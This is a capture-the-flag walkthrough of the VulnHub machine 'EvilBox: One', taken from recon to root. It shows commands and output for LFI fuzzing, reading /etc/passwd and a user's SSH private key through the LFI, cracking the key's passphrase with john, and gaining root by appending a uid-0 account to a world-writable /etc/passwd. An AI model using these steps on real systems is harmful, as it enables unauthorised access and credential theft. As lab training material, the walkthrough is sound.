# Vulnhub - EvilBox: One - Walkthrough
![image](img/box start.jpg)

Evilbox: One is a boot-to-root vulnerable machine. It is available to download from [VulnHub](https://www.vulnhub.com/entry/evilbox-one,736/)

The machine's `ip` can be found on the login screen of the machine. Alternatively, `netdiscover` or `nmap` can be used to assist in locating the machine's `ip`, as shown below.

```
❯ sudo nmap -sP 192.168.0.0/24
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-31 21:53 EDT
...
Nmap scan report for 192.168.0.243
Host is up (0.00018s latency).
MAC Address: 08:00:27:44:6F:27 (Oracle VirtualBox virtual NIC)
Nmap done: 256 IP addresses (14 hosts up) scanned in 2.99 seconds
```

## Recon

We begin with an `nmap` scan to reveal any open ports on the host.
```
❯ sudo nmap -sC -sV -p- -T4 -oN evilboxone.nmap 192.168.0.243 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-31 21:57 EDT
Nmap scan report for 192.168.0.243
Host is up (0.00012s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:95:50:0b:e4:73:a1:85:11:ca:10:ec:1c:cb:d4:26 (RSA)
|   256 27:db:6a:c7:3a:9c:5a:0e:47:ba:8d:81:eb:d6:d6:3c (ECDSA)
|_  256 e3:07:56:a9:25:63:d4:ce:39:01:c1:9a:d9:fe:de:64 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 08:00:27:44:6F:27 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.69 seconds
```
The scan shows ports `22` and `80` are open. `nmap` also tells us that the host is running `Apache 2.4.38` and is possibly a `Debian` system. Browsing to `http://192.168.0.243` does not reveal anything spectacular, as the default `Apache` landing page is still in place. From here, we will use `gobuster` to try to reveal any hidden files and directories.

```
❯ gobuster dir -u http://192.168.0.243 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html -o evilboxone.gobuster
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.243
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html
[+] Timeout:                 10s
===============================================================
2021/10/31 22:04:57 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
/secret               (Status: 301) [Size: 315] [--> http://192.168.0.243/secret/]
/server-status        (Status: 403) [Size: 278]                                   
                                                                                  
===============================================================
2021/10/31 22:06:17 Finished
===============================================================
```
`gobuster` has found a directory named `/secret`, however when trying to browse to that directory the page appears empty. To ensure that this directory is not hiding anything from us, `gobuster` can be ran inside `/secret` as well.

```
❯ gobuster dir -u http://192.168.0.243/secret -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html -o evilboxone.gobuster
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.243/secret
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html
[+] Timeout:                 10s
===============================================================
2021/10/31 22:08:01 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 4]
/evil.php             (Status: 200) [Size: 0]
                                             
===============================================================
2021/10/31 22:09:24 Finished
===============================================================
```
Success! The directory was hiding `evil.php`! `curl` can be used to try to see what this returns.
```
❯ curl -v http://192.168.0.243/secret/evil.php
*   Trying 192.168.0.243:80...
* Connected to 192.168.0.243 (192.168.0.243) port 80 (#0)
> GET /secret/evil.php HTTP/1.1
> Host: 192.168.0.243
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Mon, 01 Nov 2021 02:12:20 GMT
< Server: Apache/2.4.38 (Debian)
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host 192.168.0.243 left intact
```
We get nothing in return. Knowing this is a `linux` system, we can try to enumerate parameters for `evil.php`. Given it's name, we can try to see if this will provide us with an `LFI` or even `RCE`. Using `ffuf`, we will first begin to try to see if we can get `LFI` on a known file to exist on the system, such as `/etc/passwd`.
```
❯ ffuf -c -r -u 'http://192.168.0.243/secret/evil.php?FUZZ=/etc/passwd' -w /usr/share/dirb/wordlists/common.txt -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.0.243/secret/evil.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 0
________________________________________________

command                 [Status: 200, Size: 1398, Words: 13, Lines: 27]
:: Progress: [4614/4614] :: Job [1/1] :: 44 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```
Another win! We can use `evil.php` to successfully perform an `LFI` attack.

## User flag

Knowing we have `LFI`, we can begin to enumerate users on the host. This time we grab and view the `/etc/passwd` file for valid users on the system. Using `curl` and `grep`, we can grab `/etc/passwd` and filter for accounts that contain a shell.
```
❯ curl http://192.168.0.243/secret/evil.php?command=/etc/passwd | grep bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1398  100  1398    0     0  1365k      0 --:--:-- --:--:-- --:--:-- 1365k
root:x:0:0:root:/root:/bin/bash
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
```
We have a user named `mowree` on the system. We can conduct further enumeration on the system for anything interesting, such as `ssh-keys`.
```
❯ curl http://192.168.0.243/secret/evil.php?command=/home/mowree/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E

uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6
hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe
o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb
+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot
b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k
HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg
9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY
zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu
rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1
tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs
94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm
VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7
Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P
hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr
Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR
IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R
MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS
62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69
Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8
p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C
pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X
KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa
i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp
4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/
8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==
-----END RSA PRIVATE KEY-----
```
Success! We were able to find a private key! However, it is protected with a passphrase. We can save the private key and try to use `john` to crack the passphrase.
```
❯ curl http://192.168.0.243/secret/evil.php?command=/home/mowree/.ssh/id_rsa > id_rsa
❯ chmod 600 id_rsa 
❯ /usr/share/john/ssh2john.py id_rsa > hash
```
Now we can use `john` to try to crack the hash.
```
❯ john hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
...
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
unicorn          (id_rsa)
```
Now that we have the passphrase, `unicorn`, we can use the private key to try to log in using `ssh`
```
❯ ssh -i id_rsa mowree@192.168.0.243
The authenticity of host '192.168.0.243 (192.168.0.243)' can't be established.
ECDSA key fingerprint is SHA256:cd9WCNmPY0i3zsZaPEV0qa7yp5hz8+TVNalFULd5CwM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.243' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Linux EvilBoxOne 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
mowree@EvilBoxOne:~$
```
And now we have access to `user.txt`.
```
mowree@EvilBoxOne:~$ wc user.txt 
 1  1 31 user.txt
```

## Root flag

Now that we have user access on the host, we can begin enumerating a path to `root` user. After some quick checks, we find that the permissions on `/etc/passwd` are misconfigured, allowing anyone to write to the file.
```
mowree@EvilBoxOne:~$ ls -la /etc/passwd
-rw-rw-rw- 1 root root 1398 ago 16 13:20 /etc/passwd
```
This makes escalating to `root` almost trivial. We can just append a new user to the end of `/etc/passwd` that will have the same `uid` and `gid` as `root`.
```
mowree@EvilBoxOne:~$ echo hacker:$(openssl passwd -6 password):0:0:hacker:/root:/bin/bash >> /etc/passwd
```
And now we can `su` to our newly created user, `hacker`, with the password `password`.
```
mowree@EvilBoxOne:~$ su hacker
Contraseña: 
root@EvilBoxOne:/home/mowree#
```
We are now `root` and can grab `root.txt`!
```
root@EvilBoxOne:/home/mowree# whoami; id; wc /root/root.txt 
root
uid=0(root) gid=0(root) grupos=0(root)
 1  1 31 /root/root.txt
 ```






